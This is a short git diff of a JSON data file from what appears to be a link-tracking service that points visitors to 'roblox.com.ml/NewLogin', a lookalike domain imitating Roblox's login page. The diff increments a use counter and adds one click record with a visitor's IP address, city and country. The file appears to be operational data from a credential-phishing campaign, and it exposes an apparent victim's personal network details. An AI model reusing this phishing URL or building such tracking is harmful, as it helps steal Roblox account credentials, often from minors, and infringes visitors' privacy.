@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 506,
+    "useCount": 507,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4160,6 +4160,14 @@
         "city": "Sebastian",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777085945872,
+        "ip": "38.25.17.247",
+        "country": "Peru",
+        "city": "Lima",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
